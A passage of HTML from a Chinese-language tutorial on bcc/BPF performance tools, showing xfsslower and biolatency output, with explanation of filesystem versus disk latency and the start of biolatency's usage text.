class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">auditd</span><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">651</span><span class=\"crayon-h\">    </span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">           </span><span class=\"crayon-cn\">2.43</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">audit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">log</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000a4145775236-6\"><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">17</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">cksum</span><span class=\"crayon-h\">          </span><span class=\"crayon-cn\">4167</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">52976</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">           </span><span class=\"crayon-cn\">1.04</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">at</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000a4145775236-7\"><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">17</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">45</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">cksum</span><span class=\"crayon-h\">          </span><span class=\"crayon-cn\">4168</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">53264</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">           </span><span class=\"crayon-cn\">1.62</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000a4145775236-8\"><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">17</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">45</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">cksum</span><span class=\"crayon-h\">          </span><span class=\"crayon-cn\">4168</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">65536</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">           </span><span class=\"crayon-cn\">1.01</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">certutil</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000a4145775236-9\"><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">17</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">45</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">cksum</span><span class=\"crayon-h\">          </span><span class=\"crayon-cn\">4168</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">65536</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">           </span><span class=\"crayon-cn\">1.01</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">dir</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000a4145775236-10\"><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">17</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">45</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">cksum</span><span class=\"crayon-h\">          </span><span class=\"crayon-cn\">4168</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">65536</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">           </span><span class=\"crayon-cn\">1.17</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">dirmngr</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">client</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000a4145775236-11\"><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">17</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">46</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">cksum</span><span class=\"crayon-h\">          </span><span class=\"crayon-cn\">4168</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">65536</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">           </span><span class=\"crayon-cn\">1.06</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">grub2</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">file</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000a4145775236-12\"><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">17</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">46</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">cksum</span><span class=\"crayon-h\">          </span><span class=\"crayon-cn\">4168</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">65536</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">128</span><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">1.01</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">grub2</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">fstest</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000a4145775236-13\"><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000a4145775236-14\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0045 seconds] -->\r\n<p>在上图输出中，我捕获到了多个延迟超过 1 毫秒 的 <code>cksum(1)</code> 读取操作（字段 “T” 等于 “R”）。这是在 <code>xfsslower</code> 工具运行的时候，通过在 XFS 中动态地检测内核函数实现的，并当它结束的时候解除该检测。这个 bcc 工具也有其它文件系统的版本：<code>ext4slower</code>、<code>btrfsslower</code>、<code>zfsslower</code> 和 <code>nfsslower</code>。</p>\n<p>这是个有用的工具，也是 BPF 追踪的重要例子。对文件系统性能的传统分析主要集中在块 I/O 统计信息 —— 通常你看到的是由 <code>iostat(1)</code> 工具输出，并由许多性能监视 GUI 绘制的图表。这些统计数据显示的是磁盘如何执行，而不是真正的文件系统如何执行。通常比起磁盘来说，你更关心的是文件系统的性能，因为应用程序是在文件系统中发起请求和等待。并且，文件系统的性能可能与磁盘的性能大为不同！文件系统可以完全从内存缓存中读取数据，也可以通过预读算法和回写缓存来填充缓存。<code>xfsslower</code> 显示了文件系统的性能 —— 这是应用程序直接体验到的性能。通常这对于排除整个存储子系统的问题是有用的；如果确实没有文件系统延迟，那么性能问题很可能是在别处。</p>\n<h4 id=\"toc_5\">4、 biolatency</h4>\n<p>虽然文件系统性能对于理解应用程序性能非常重要，但研究磁盘性能也是有好处的。当各种缓存技巧都无法挽救其延迟时，磁盘的低性能终会影响应用程序。 磁盘性能也是容量规划研究的目标。</p>\n<p><code>iostat(1)</code> 工具显示了平均磁盘 I/O 延迟，但平均值可能会引起误解。 以直方图的形式研究 I/O 延迟的分布是有用的，这可以通过使用 [biolatency] 来实现<a href=\"https://github.com/iovisor/bcc/blob/master/tools/biolatency.py\">18</a>：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f303f000a9278094072\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/biolatency\r\nTracing block device I/O... Hit Ctrl-C to end.\r\n^C\r\n     usecs               : count     distribution\r\n         0 -&gt; 1          : 0        |                                        |\r\n         2 -&gt; 3          : 0        |                                        |\r\n         4 -&gt; 7          : 0        |                                        |\r\n         8 -&gt; 15         : 0        |                                        |\r\n        16 -&gt; 31         : 0        |                                        |\r\n        32 -&gt; 63         : 1        |                                        |\r\n        64 -&gt; 127        : 63       |****                                    |\r\n       128 -&gt; 255        : 121      |*********                               |\r\n       256 -&gt; 511        : 483      |************************************    |\r\n       512 -&gt; 1023       : 532      |****************************************|\r\n      1024 -&gt; 2047       : 117      |********                                |\r\n      2048 -&gt; 4095       : 8        |                                        |\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000a9278094072-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000a9278094072-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000a9278094072-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000a9278094072-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000a9278094072-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000a9278094072-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000a9278094072-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000a9278094072-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000a9278094072-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000a9278094072-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000a9278094072-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000a9278094072-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000a9278094072-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000a9278094072-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000a9278094072-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000a9278094072-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000a9278094072-17\">17</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f303f000a9278094072-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/biolatency</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000a9278094072-2\"><span class=\"crayon-e\">Tracing </span><span class=\"crayon-e\">block </span><span class=\"crayon-i\">device</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">I</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">O</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Hit </span><span class=\"crayon-v\">Ctrl</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">C</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">end</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000a9278094072-3\"><span class=\"crayon-o\">^</span><span class=\"crayon-i\">C</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000a9278094072-4\"><span class=\"crayon-h\">     </span><span class=\"crayon-v\">usecs</span><span class=\"crayon-h\">               </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">count     </span><span class=\"crayon-i\">distribution</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000a9278094072-5\"><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">          </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">                                        </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000a9278094072-6\"><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">          </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">                                        </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000a9278094072-7\"><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-h\">          </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">                                        </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000a9278094072-8\"><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15</span><span class=\"crayon-h\">         </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">                                        </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000a9278094072-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">16</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">31</span><span class=\"crayon-h\">         </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">                                        </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000a9278094072-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">32</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">63</span><span class=\"crayon-h\">         </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">                                        </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000a9278094072-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">64</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">127</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">63</span><span class=\"crayon-h\">       </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\">                                    </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000a9278094072-12\"><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">128</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">255</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">121</span><span class=\"crayon-h\">      </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\">                               </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000a9278094072-13\"><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">256</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">511</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">483</span><span class=\"crayon-h\">      </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000a9278094072-14\"><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">512</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1023</span><span class=\"crayon-h\">       </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">532</span><span class=\"crayon-h\">      </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000a9278094072-15\"><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">1024</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2047</span><span class=\"crayon-h\">       </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">117</span><span class=\"crayon-h\">      </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\">                                </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000a9278094072-16\"><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">2048</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4095</span><span class=\"crayon-h\">       </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">                                        </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000a9278094072-17\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0057 seconds] -->\r\n<p>这是另一个有用的工具和例子；它使用一个名为 maps 的 BPF 特性，它可以用来实现高效的内核摘要统计。从内核层到用户层的数据传输仅仅是“计数”列。 用户级程序生成其余的。</p>\n<p>值得注意的是，这种工具大多支持 CLI 选项和参数，如其使用信息所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f303f000ae617232921\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/biolatency -h\r\nusage: biolatency [-h] [-T] [-Q] [-m] [-D] [interval] [count]\r\n\r\nSummarize block device I/O latency as a histogram\r\n\r\npositional arguments:\r\n  interval            output interval, in seconds\r\n  count               number of outputs\r\n\r\noptional arguments:\r\n  -h, --help          show this help message and exit\r\n  -T, --timestamp     include timestamp on output\r\n  -Q, --queued        include OS queued time in I/O time\r\n  -m, --milliseconds  millisecond histogram\r\n  -D, --disks         print a histogram per disk device\r\n\r\nexamples:\r\n    ./biolatency            # summarize block I/O latency as a histogram\r\n    ./biolatency 1 10       # print 1 second summaries, 10 times\r\n    ./biolatency -mT 1      # 1s summaries, milliseconds, and timestamps\r\n    ./biolatency -Q         # include OS queued time in I/O time\r\n    ./biolatency -D         # show each disk device separately\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000ae617232921-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000ae617232921-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000ae617232921-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000ae617232921-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000ae617232921-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000ae617232921-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000ae617232921-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000ae617232921-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000ae617232921-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000ae617232921-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000ae617232921-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000ae617232921-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000ae617232921-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000ae617232921-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000ae617232921-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000ae617232921-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000ae617232921-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000ae617232921-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000ae617232921-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000ae617232921-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000ae617232921-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000ae617232921-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000ae617232921-23\">23</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f303f000ae617232921-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/biolatency -h</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000ae617232921-2\"><span class=\"crayon-v\">usage</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">biolatency</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span 